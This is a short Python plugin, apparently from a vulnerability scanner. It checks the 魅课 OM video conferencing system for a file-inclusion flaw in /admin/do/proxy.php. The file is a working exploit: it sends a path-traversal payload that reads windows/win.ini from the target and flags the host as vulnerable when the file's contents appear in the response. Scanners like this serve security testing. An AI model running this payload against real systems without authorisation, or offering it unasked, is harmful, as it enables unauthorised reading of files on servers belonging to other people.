#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = 'https://peiqi.wgpsec.org/wiki/webapp/魅课信息/魅课 OM视频会议系统 proxy.php 文件包含漏洞.html'
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "魅课 OM视频会议系统 proxy.php 文件包含"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret 